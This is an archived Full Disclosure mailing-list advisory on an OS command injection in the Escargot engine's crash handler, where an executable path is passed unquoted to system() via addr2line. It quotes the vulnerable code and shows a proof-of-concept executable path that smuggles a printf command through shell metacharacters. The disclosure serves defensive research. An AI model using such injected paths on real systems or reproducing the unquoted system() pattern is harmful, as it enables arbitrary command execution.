---
title: Escargot v4.3.0-214-gfaee4437 OS Command Injection in Crash Handler via Unsanitized Executable Path
url: https://seclists.org/fulldisclosure/2026/Aug/108
source: Full Disclosure
date: 2026-08-26
fetch_date: 2026-08-27T12:14:25.185151
---

# Escargot v4.3.0-214-gfaee4437 OS Command Injection in Crash Handler via Unsanitized Executable Path

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](107)
[By Date](date.html#108)
[![Next](/images/right-icon-16x16.png)](109)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#108)
[![Next](/images/right-icon-16x16.png)](109)

![](/shared/images/nst-icons.svg#search)

# Escargot v4.3.0-214-gfaee4437 OS Command Injection in Crash Handler via Unsanitized Executable Path

---

*From*: Ron E <ronaldjedgerson () gmail com>
*Date*: Sat, 22 Aug 2026 08:45:16 -0400

---

```
An OS command injection vulnerability exists in the Escargot
v4.3.0-214-gfaee4437 crash handler due to an executable/module path being
incorporated into an addr2line shell command without quoting or escaping.
The resulting command is executed using system(), causing shell
metacharacters contained within the path to be interpreted as command
syntax.

By launching Escargot using a crafted executable path containing shell
metacharacters and subsequently triggering the crash handler, arbitrary
shell commands can be executed with the privileges of the Escargot process.

Dynamic testing confirmed command execution by injecting a benign printf
command into the executable filename. Following a controlled crash, the
injected command executed and created a marker file containing
ESCARGOT_CMD_INJECTION_CONFIRMED.

Technical Details

During crash processing, Escargot generates symbolic stack-trace
information by constructing an addr2line command containing an
executable/module path obtained from the backtrace.

The affected code follows this pattern:

sprintf(
    syscom,
    "addr2line %s -e %s",
    addr.c_str(),
    modulePath.c_str());

system(syscom);

modulePath is inserted directly into the command string without shell
quoting, escaping, validation, or argument separation.

Because the resulting string is passed to system(), /bin/sh interprets
shell metacharacters contained within modulePath.

A path containing characters such as:

;
```

> ```
>
> ```

```
#

can therefore alter the structure of the intended addr2line command and
introduce additional shell commands.

Root Cause

Use of system() to invoke addr2line
Shell command constructed using sprintf()
Executable/module path inserted directly into command
No shell escaping or quoting
No validation of shell metacharacters
No argument separation

The fundamental issue is that a filesystem path is treated as part of a
shell command rather than as an opaque argument to the addr2line executable
Security Impact

An attacker capable of influencing the executable or module path processed
by the crash handler and causing the affected crash-handling path to
execute may run arbitrary operating-system commands with the privileges of
the Escargot process.

Potential impact includes:

Arbitrary OS Command Execution:
Injected shell commands execute in the context of the crashing process.

File Creation or Modification:
Commands can create or modify files accessible to the process.

Local Resource Access:
Injected commands inherit the filesystem and operating-system
permissions of the Escargot process.

Further Host Compromise:
Impact may increase depending on the privileges and execution
environment of the affected process.

The demonstrated PoC establishes command execution under conditions where
the executable path is attacker-controlled. It does not independently
establish that a remote attacker can control the executable/module path in
a standard Escargot deployment.

PoC Results
======================================================================
 PoC: Shell Crash Handler Command Injection
======================================================================

[+] RESULT: VULNERABILITY CONFIRMED

[+] Command injection successfully triggered through the crash-handler
    executable path.

[+] Injection Payload

printf${IFS}ESCARGOT_CMD_INJECTION_CONFIRMED>escargot_cmd_injection_proof

[+] Crafted Executable Path

/tmp/escargot-poc-bin/escargot;printf${IFS}ESCARGOT_CMD_INJECTION_CONFIRMED>escargot_cmd_injection_proof;#

[+] Crash Trigger
    Signal:      SIGABRT (6)
    Return Code: -6
    PID:         3988

[+] Arbitrary Command Execution Evidence
    Proof File:

/work/escargot/security-poc/build-debugger-test/escargot_cmd_injection_proof

    File Created: YES

    File Contents:
      ESCARGOT_CMD_INJECTION_CONFIRMED

[+] Exploitation Chain
    1. Escargot is executed from a path containing shell metacharacters.
    2. A controlled crash triggers the crash/signal handler.
    3. The handler incorporates the executable path into a shell command.
    4. Shell metacharacters in the executable path are interpreted.
    5. The injected printf command executes.
    6. A proof file containing the expected marker is created.

[+] Relevant Runtime Evidence

    Waiting for client connection 0.0.0.0:6514
    Connected from: 127.0.0.1

    Assertion `false' failed.
    Got signal 6, pid 3988

    [bt] Execution path:
    ...
    addr2line: '/tmp/escargot-poc-bin/escargot': No such file

[+] Verification
    Expected marker: ESCARGOT_CMD_INJECTION_CONFIRMED
    Observed marker: ESCARGOT_CMD_INJECTION_CONFIRMED

Ron Edgerson
Vulnerability Researcher & Exploit Developer

CVE Research | Binary Exploitation | Application & Systems Security
Responsible Disclosure • Proof-of-Concept Development

🌐 https://github.com/ob1sec
🔗 https://www.linkedin.com/in/ronedgerson1
<https://linkedin.com/in/yourhandle>
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](107)
[By Date](date.html#108)
[![Next](/images/right-icon-16x16.png)](109)

[![Previous](/images/left-icon-16x16.png)](107)
[By Thread](index.html#108)
[![Next](/images/right-icon-16x16.png)](109)

### Current thread:

* **Escargot v4.3.0-214-gfaee4437 OS Command Injection in Crash Handler via Unsanitized Executable Path** *Ron E (Aug 26)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/image...